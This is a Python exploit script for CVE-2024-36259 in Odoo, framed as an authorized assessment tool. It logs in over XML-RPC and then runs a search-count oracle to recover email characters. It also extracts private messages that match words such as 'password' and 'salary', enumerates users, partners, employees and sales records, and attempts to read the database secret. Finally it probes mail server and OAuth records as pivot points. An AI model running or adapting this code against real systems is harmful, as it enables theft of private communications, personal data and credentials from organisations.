#!/usr/bin/env python3
"""
CVE-2024-36259 Advanced Security Assessment Tool
For authorized security testing only - demonstrates full vulnerability impact
"""

import xmlrpc.client
import requests
import json
import time
import sys
import base64
import hashlib
from typing import Dict, List, Optional, Any
from datetime import datetime, timedelta

class AdvancedOdooExploitDemo:
    def __init__(self, url: str, database: str, username: str, password: str):
        """Initialize advanced exploitation demonstrator"""
        self.url = url.rstrip('/')
        self.database = database
        self.username = username
        self.password = password
        self.uid = None
        self.models = None
        self.extracted_data = {
            'messages': [],
            'users': [],
            'partners': [],
            'sensitive_fields': []
        }
        
    def authenticate(self) -> bool:
        """Authenticate and establish XML-RPC connection"""
        try:
            common = xmlrpc.client.ServerProxy(f'{self.url}/xmlrpc/2/common')
            self.uid = common.authenticate(
                self.database, self.username, self.password, {}
            )
            
            if self.uid:
                self.models = xmlrpc.client.ServerProxy(f'{self.url}/xmlrpc/2/object')
                print(f"[+] Authenticated as UID: {self.uid}")
                print(f"[+] Current user: {self.username}")
                return True
            return False
        except Exception as e:
            print(f"[-] Authentication failed: {e}")
            return False
    
    def demonstrate_oracle_extraction(self):
        """Demonstrate oracle-based data extraction technique"""
        print("\n" + "="*60)
        print("[DEMO] Oracle-Based Information Extraction")
        print("="*60)
        
        # Demonstrate how the oracle works
        print("\n[*] Demonstrating yes/no oracle technique...")
        
        # Example: Extract admin user ID through binary search
        print("[*] Extracting admin user information via oracle...")
        
        admin_exists_queries = [
            ("Admin exists check", [('id', '=', 2)]),  # Common admin ID
            ("Has admin rights", [('groups_id.name', 'ilike', 'Administration')]),
            ("Email domain extraction", [('email', 'ilike', '%@%')])
        ]
        
        for desc, domain in admin_exists_queries:
            try:
                count = self.models.execute_kw(
                    self.database, self.uid, self.password,
                    'res.users', 'search_count', [domain]
                )
                print(f"  [{desc}]: {'YES' if count > 0 else 'NO'} (Results: {count})")
            except:
                pass
        
        # Demonstrate character-by-character extraction
        self.extract_sensitive_via_oracle()
    
    def extract_sensitive_via_oracle(self):
        """Extract sensitive data character by character using oracle"""
        print("\n[*] Demonstrating character extraction via oracle...")
        
        # This simulates how an attacker would extract email addresses
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789@.-_'
        extracted_chars = []
        
        print("[*] Extracting first email address character pattern...")
        for char in ['a', 'j', 'm', 's']:  # Limited demo
            domain = [('email', 'ilike', f'{char}%')]
            try:
                count = self.models.execute_kw(
                    self.database, self.uid, self.password,
                    'res.users', 'search_count', [domain]
                )
                if count > 0:
                    print(f"  [+] Found {count} emails starting with '{char}'")
                    extracted_chars.append(char)
            except:
                pass
    
    def extract_all_messages(self):
        """Extract all accessible messages to demonstrate impact"""
        print("\n" + "="*60)
        print("[DEMO] Full Message Extraction Capability")
        print("="*60)
        
        try:
            # Get message statistics
            total_messages = self.models.execute_kw(
                self.database, self.uid, self.password,
                'mail.message', 'search_count', [[]]
            )
            
            own_messages = self.models.execute_kw(
                self.database, self.uid, self.password,
                'mail.message', 'search_count', [[('create_uid', '=', self.uid)]]
            )
            
            other_messages = total_messages - own_messages
            
            print(f"\n[!] Message Access Statistics:")
            print(f"    Total messages in system: {total_messages}")
            print(f"    Your messages: {own_messages}")
            print(f"    Other users' messages accessible: {other_messages}")
            print(f"    Privilege escalation factor: {other_messages/own_messages:.1f}x")
            
            # Extract sample of sensitive messages
            print("\n[*] Extracting sample of sensitive messages...")
            
            sensitive_keywords = ['password', 'confidential', 'secret', 'private', 
                                 'salary', 'payment', 'contract', 'personal']
            
            for keyword in sensitive_keywords[:3]:  # Limited demo
                try:
                    messages = self.models.execute_kw(
                        self.database, self.uid, self.password,
                        'mail.message', 'search_read',
                        [[('body', 'ilike', f'%{keyword}%')]],
                        {'fields': ['id', 'subject', 'date', 'author_id'], 'limit': 2}
                    )
                    
                    if messages:
                        print(f"  [!] Found {len(messages)} messages containing '{keyword}'")
                        for msg in messages:
                            print(f"      - ID: {msg['id']}, Date: {msg['date']}")
                            self.extracted_data['messages'].append(msg['id'])
                except:
                    pass
            
            return other_messages > 0
            
        except Exception as e:
            print(f"[-] Message extraction error: {str(e)[:50]}")
            return False
    
    def enumerate_users_and_partners(self):
        """Enumerate all users and partners through the vulnerability"""
        print("\n" + "="*60)
        print("[DEMO] User and Partner Enumeration")
        print("="*60)
        
        try:
            # Enumerate users
            users = self.models.execute_kw(
                self.database, self.uid, self.password,
                'res.users', 'search_read',
                [[('id', '!=', self.uid)]],
                {'fields': ['id', 'login', 'name', 'email'], 'limit': 5}
            )
            
            if users:
                print(f"\n[!] Successfully enumerated {len(users)} other users:")
                for user in users:
                    print(f"    - {user['name']} ({user['login']}) - {user.get('email', 'N/A')}")
                    self.extracted_data['users'].append(user['id'])
            
            # Enumerate partners (customers/suppliers)
            partners = self.models.execute_kw(
                self.database, self.uid, self.password,
                'res.partner', 'search_read',
                [[('is_company', '=', True)]],
                {'fields': ['id', 'name', 'email', 'phone'], 'limit': 5}
            )
            
            if partners:
                print(f"\n[!] Successfully enumerated {len(partners)} business partners:")
                for partner in partners:
                    print(f"    - {partner['name']} - {partner.get('email', 'N/A')}")
                    self.extracted_data['partners'].append(partner['id'])
                    
        except Exception as e:
            print(f"[-] Enumeration error: {str(e)[:50]}")
    
    def extract_business_intelligence(self):
        """Extract business-sensitive information"""
        print("\n" + "="*60)
        print("[DEMO] Business Intelligence Extraction")
        print("="*60)
        
        sensitive_models = {
            'sale.order': ['name', 'amount_total', 'partner_id', 'date_order'],
            'account.invoice': ['name', 'amount_total', 'partner_id'],
            'hr.employee': ['name', 'work_email', 'mobile_phone'],
            'project.project': ['name', 'partner_id'],
            'crm.lead': ['name', 'email_from', 'probability', 'expected_revenue']
        }
        
        print("\n[*] Attempting to access business-critical models...")
        
        for model, fields in sensitive_models.items():
            try:
                count = self.models.execute_kw(
                    self.database, self.uid, self.password,
                    model, 'search_count', [[]]
                )
                
                if count > 0:
                    print(f"\n[!] Model '{model}' is accessible: {count} records")
                    
                    # Try to extract sample
                    sample = self.models.execute_kw(
                        self.database, self.uid, self.password,
                        model, 'search_read', [[]],
                        {'fields': fields, 'limit': 2}
                    )
                    
                    if sample:
                        print(f"    [+] Successfully extracted {len(sample)} sample records")
                        for field in fields:
                            if field in sample[0]:
                                self.extracted_data['sensitive_fields'].append(f"{model}.{field}")
                                
            except:
                pass  # Model might not be installed
    
    def demonstrate_privilege_escalation(self):
        """Show privilege escalation possibilities"""
        print("\n" + "="*60)
        print("[DEMO] Privilege Escalation Analysis")
        print("="*60)
        
        try:
            # Check what administrative functions we can access
            admin_models = [
                ('ir.config_parameter', 'System Parameters'),
                ('ir.module.module', 'Installed Modules'),
                ('ir.model.access', 'Access Rights'),
                ('res.groups', 'User Groups'),
                ('ir.rule', 'Record Rules')
            ]
            
            print("\n[*] Testing access to administrative models...")
            
            for model, description in admin_models:
                try:
                    count = self.models.execute_kw(
                        self.database, self.uid, self.password,
                        model, 'search_count', [[]]
                    )
                    
                    if count > 0:
                        print(f"  [!] Can access {description}: {count} records")
                        
                        # Try to read sensitive config
                        if model == 'ir.config_parameter':
                            params = self.models.execute_kw(
                                self.database, self.uid, self.password,
                                model, 'search_read',
                                [[('key', 'in', ['database.secret', 'database.uuid'])]],
                                {'fields': ['key', 'value'], 'limit': 5}
                            )
                            if params:
                                print(f"      [+] Extracted system parameters!")
                                
                except:
                    print(f"  [-] No access to {description}")
                    
        except Exception as e:
            print(f"[-] Privilege escalation test error: {str(e)[:50]}")
    
    def demonstrate_lateral_movement(self):
        """Show potential for lateral movement in the system"""
        print("\n" + "="*60)
        print("[DEMO] Lateral Movement Possibilities")
        print("="*60)
        
        print("\n[*] Analyzing cross-module data access...")
        
        # Check connected systems
        connections = {
            'fetchmail.server': 'Email Server Credentials',
            'ir.mail_server': 'SMTP Configuration',
            'auth.oauth.provider': 'OAuth Providers',
            'base.document.layout': 'Document Templates'
        }
        
        for model, description in connections.items():
            try:
                records = self.models.execute_kw(
                    self.database, self.uid, self.password,
                    model, 'search_read', [[]],
                    {'fields': ['id', 'name'], 'limit': 1}
                )
                
                if records:
                    print(f"  [!] Found {description}: Potential pivot point")
                    
            except:
                pass
    
    def generate_impact_report(self):
        """Generate comprehensive impact assessment"""
        print("\n" + "="*60)
        print("[REPORT] CVE-2024-36259 Impact Assessment")
        print("="*60)
        
        report = f"""
Security Impact Summary for {self.url}
========================================
Database: {self.database}
Assessment Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

CRITICAL FINDINGS:
------------------
✗ Unauthorized access to {len(self.extracted_data['messages'])} private messages
✗ Enumerated {len(self.extracted_data['users'])} user accounts
✗ Accessed {len(self.extracted_data['partners'])} business partner records
✗ Exposed {len(self.extracted_data['sensitive_fields'])} sensitive data fields

ATTACK VECTORS CONFIRMED:
-------------------------
1. Oracle-based information disclosure
2. Privilege escalation through mail module
3. Cross-module data access
4. Business intelligence extraction

POTENTIAL BUSINESS IMPACT:
--------------------------
• Complete email/communication breach
• Customer data exposure (GDPR violation risk)
• Competitive intelligence leak
• Internal sensitive information disclosure
• Potential for supply chain attacks

IMMEDIATE ACTIONS REQUIRED:
---------------------------
1. PATCH IMMEDIATELY to latest Odoo version
2. Enable audit logging on mail module
3. Review user access logs for anomalies
4. Notify security team and management
5. Prepare incident response plan

COMPLIANCE IMPLICATIONS:
------------------------
• GDPR: Potential data breach requiring notification
• SOC2: Security control failure
• ISO27001: Information security incident
• Industry-specific regulations may apply
"""
        print(report)
        
        # Save detailed extraction log
        with open(f'cve_2024_36259_assessment_{int(time.time())}.json', 'w') as f:
            json.dump({
                'url': self.url,
                'database': self.database,
                'timestamp': datetime.now().isoformat(),
                'extracted_counts': {
                    'messages': len(self.extracted_data['messages']),
                    'users': len(self.extracted_data['users']),
                    'partners': len(self.extracted_data['partners']),
                    'fields': len(self.extracted_data['sensitive_fields'])
                },
                'risk_level': 'CRITICAL'
            }, f, indent=2)
        
        print(f"\n[*] Detailed report saved to: cve_2024_36259_assessment_{int(time.time())}.json")

def main():
    if len(sys.argv) != 5:
        print("Advanced CVE-2024-36259 Security Assessment Tool")
        print("Usage: python advanced_exploit.py <url> <database> <username> <password>")
        sys.exit(1)
    
    url, database, username, password = sys.argv[1:5]
    
    print("╔" + "═"*58 + "╗")
    print("║   CVE-2024-36259 ADVANCED SECURITY ASSESSMENT TOOL      ║")
    print("║          FOR AUTHORIZED TESTING ONLY                    ║")
    print("╚" + "═"*58 + "╝")
    
    print(f"\n[!] WARNING: This demonstrates severe security impact")
    print(f"[!] Target: {url}")
    print(f"[!] Database: {database}")
    
    # Confirm authorization
    confirm = input("\n[?] Confirm you have authorization to test this system (yes/no): ")
    if confirm.lower() != 'yes':
        print("[-] Aborted. Only run on authorized systems.")
        sys.exit(1)
    
    exploit = AdvancedOdooExploitDemo(url, database, username, password)
    
    if exploit.authenticate():
        print("\n[+] Starting advanced vulnerability demonstration...")
        
        # Run comprehensive demonstration
        exploit.demonstrate_oracle_extraction()
        exploit.extract_all_messages()
        exploit.enumerate_users_and_partners()
        exploit.extract_business_intelligence()
        exploit.demonstrate_privilege_escalation()
        exploit.demonstrate_lateral_movement()
        
        # Generate final report
        exploit.generate_impact_report()
        
        print("\n" + "="*60)
        print("[!] DEMONSTRATION COMPLETE")
        print("[!] This system is CRITICALLY VULNERABLE")
        print("[!] Apply security patches IMMEDIATELY")
        print("="*60)
        
    else:
        print("[-] Authentication failed. Cannot proceed.")
        sys.exit(1)

if __name__ == "__main__":
    main()